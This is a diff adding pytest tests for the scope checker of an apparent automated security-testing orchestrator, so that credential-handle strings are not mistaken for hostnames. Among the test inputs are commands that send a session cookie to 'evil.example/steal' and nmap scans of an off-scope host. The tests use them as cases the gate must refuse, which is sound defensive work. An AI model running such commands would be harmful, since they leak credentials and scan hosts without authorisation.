@@ -218,3 +218,54 @@ class TestSegmentToolset:
         assert te._segment_violation(
             "curl http://x | nmap -sV localhost", ["curl"], None, ALIASES), \
             "segment gate no longer refuses an ungranted tool in a pipeline"
+
+
+class TestACredentialHandleIsNotAHostname:
+    """Authenticated testing had never once worked end to end.
+
+    Scope is checked BEFORE the credential handle is resolved — deliberately,
+    so the plaintext secret is never handed to the scope checker. But
+    `_BARE_HOST_RX` read the tail of `ERLIK_SECRET.95610324-3fd.cookie` as a
+    hostname with a six-letter TLD, so every step carrying a session died with
+
+        scope violation: host '3fd.cookie' is not in allow_hosts ['dvwa']
+
+    Two features that were each correct on their own, and their seam was the
+    one place authenticated testing had to pass through.
+    """
+
+    SCOPE = {"allow_hosts": ["dvwa"], "allow_ports": [80]}
+
+    def _scope(self):
+        from orchestrator.testcase.scope import Scope
+        return Scope(**self.SCOPE)
+
+    def test_a_command_carrying_a_handle_is_allowed(self):
+        from orchestrator.testcase.scope import check_command
+        cmd = ('curl -s -b "ERLIK_SECRET.95610324-3fd.cookie" '
+               '"http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"')
+        check_command(cmd, self._scope(), primary_url="http://dvwa/vulnerabilities/sqli/")
+
+    def test_every_handle_field_name_is_covered(self):
+        """`.cookie` is not special — `.token`, `.header` and any future field
+        are the same shape."""
+        from orchestrator.credentials import handle
+        from orchestrator.testcase.scope import check_command
+        for field in ("cookie", "token", "auth_header", "jwt"):
+            cmd = f'curl -H "{handle("95610324-3fd", field)}" http://dvwa/'
+            check_command(cmd, self._scope())
+
+    def test_masking_the_handle_does_not_blind_the_gate(self):
+        """The control. An off-host URL in the SAME command must still be
+        refused — the fix must remove a false positive, not the check."""
+        from orchestrator.testcase.scope import check_command, ScopeViolation
+        cmd = ('curl -s -b "ERLIK_SECRET.95610324-3fd.cookie" '
+               'http://evil.example/steal')
+        with pytest.raises(ScopeViolation):
+            check_command(cmd, self._scope())
+
+    def test_a_bare_off_host_alongside_a_handle_is_still_refused(self):
+        from orchestrator.testcase.scope import check_command, ScopeViolation
+        cmd = 'nmap -p80 evil.example -oN ERLIK_SECRET.95610324-3fd.cookie'
+        with pytest.raises(ScopeViolation):
+            check_command(cmd, self._scope())
